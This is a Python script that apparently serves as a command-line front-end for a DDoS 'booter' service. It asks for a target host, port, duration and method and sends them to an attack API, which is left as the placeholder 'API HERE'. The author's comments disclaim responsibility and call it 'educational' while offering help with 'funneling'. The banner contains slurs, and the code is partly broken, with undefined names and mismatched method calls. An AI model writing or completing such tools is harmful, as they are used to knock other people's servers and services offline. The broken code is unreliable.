import os
import requests
import time
import sys
import ctypes


#if your looking at the code first please change the name api and the methods
#you must have python installed and set in main path to run this script
#this script is a free script
#you can alter it as u like but dont skidrip it without giving me credit
#if u want help with funneling dm me on disc Paradym#0116
#if this script is getting sold please dm me 
#please do not chnage any of the code if u do not know what u are doing
#this is a very simple script but not much is needed to send a request to a api
#i have labeled eveything that can be easily changed
#if you some how break the sript please dm me 
#if theres anything u would want me to add dm me
#I AM NOT RESPONSIBLE FOR ANY DAMAGE YOU DO WITH THIS SCRIPT
#PURELY FOR EDUCATIONAL PURPOSES ONLY AND A PROOF OF CONCEPT ONLY
 
ctypes.windll.kernel32.SetConsoleTitleW("Fuck Ya Life BiNG BoNg")#the title of the python window

name = 'CHANGE ME' #chnage this to change the name of the prompt
 
methods = 'ADD METHODS'#Please Add \n Inbetween Each Method

class Main():    
    
    def __init__(self):
        self.gg = True
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.rr = '\033[39m'
        self.cls()
        self.home()
        while self.gg == True:
            global name
            choose = input(str('\033[31m'+ name +'@root>  '))
            if (choose == 'attack'):
                self.Attack()
            elif (choose == 'methods'):
                self.methods()
            elif (choose == 'clear'):
                self.cls()
                self.home()  
                  
    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt']) 
    
   
    def Attack(self):
        global name
        host = input(str('\033[31m'+ name +'@Host>  '))
        port = input(str('\033[31m'+ name +'@Port>  '))
        time = input(str('\033[31m'+ name +'@Time>  '))
        method = input(str('\033[31m'+ name +'@Method>  '))
        self.cls()
        requests.get(f'API HERE')#Please make sure for the api link you put {host} {port} {time} {method} after each input and do not remove the f in the function)
        ctypes.windll.kernel32.SetConsoleTitleW("Just Shitted On" + host)#the title of the window when an attack is send u can change everything in the quotation
        print('')
        print(self.r + '  ╔═══════════════')
        print(self.r + '  ║==Attack Sent==')
        print(self.r + '╔═╩══════════════════════')
        print(self.r + '║ Host : \033[37m[' + host + ']  ')
        print(self.r + '║ Port : \033[37m[' + port + ']  ')
        print(self.r + '║ Time : \033[37m[' + time + ']  ')
        print(self.r + '║ Method : \033[37m[' + method + ']')
        print(self.r + '╚═════════════════════════')
        print(self.r + '╔══════════════╦══════════════╗')
        print(self.r + '║ 1 : [Stay]   ║ 2 : [go back]║')
        print(self.r + '╚══════════════╩══════════════╝')
        print('')
        option = input(str('\033[31m'+ prompt +'@Option>  '))
        if (option == str(1)):
            self.attack()
        elif (option == str(2)):
            self.cls()
            self.start_logo()
            self.__init__()
            
            
    def home(self):
        print(self.r + """╔═══════════════════════════════════════╦═══════════════════════════╦═══════════════════════╗
║   ████████████████████████████████    ║███████████████████████████║          ═╦═          ║
║   █─▄▄▄▄█▄─█─▄█▄─██─▄█▄─▄███▄─▄███    ║███████▀▀▀░░░░░░░▀▀▀███████║           ║           ║
║   █▄▄▄▄─██─▄▀███─██─███─██▀██─██▀█    ║████▀░░░░░░░░░░░░░░░░░▀████║      ╠════╬════╣      ║
║   ▀▄▄▄▄▄▀▄▄▀▄▄▀▀▄▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▄▀    ║███│░░░░░░░░░░░░░░░░░░░│███║           ║           ║
╠═══════════════════════════════════════╣██▌│░░░░░░░░░░░░░░░░░░░│▐██║           ║           ║
║    Please make sure you have added    ║██░└┐░░░░░░░░░░░░░░░░░┌┘░██║           ║           ║
║    your API to the script where it    ║██░░└┐░░░░░░░░░░░░░░░┌┘░░██║      ╗    ║    ╗      ║
║    says "API HERE" and put all of     ║██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██║     ╔╬╝   ║   ╔╬╝     ║
║    your methods where it says         ║██▌░│██████▌░░░▐██████│░▐██║      ╚    ╩    ╚      ║
║    "METHODS HERE"                     ║███░│▐███▀▀░░▄░░▀▀███▌│░███╠═══════════════════════╣
║                                       ║██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██║ Makers:               ║
║    Commands:                          ║██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██║ Script:               ║
║    Attack                             ║████▄─┘██▌░░░░░░░▐██└─▄████║ Paradym               ║
║    Methods                            ║████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████║ Info:                 ║
║                                       ║█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████║ please make sure you  ║
║    You know what the commands do      ║███████▄░░░░░░░░░░░▄███████║ follow all TOS of ur  ║
║    because i hope ur not retarded     ║██████████▄▄▄▄▄▄▄██████████║ api provider          ║
╠═══════════════════════════════════════╩═══════════════════════════╩═══════════════════════╣
║   © Skull 2022 All rights reserverd for fair use and only for educational purposes only   ║
╚═══════════════════════════════════════════════════════════════════════════════════════════╝
""")
        
    
     
    def methods(self):
        global methods
        print(self.r + methods)     
        


Main()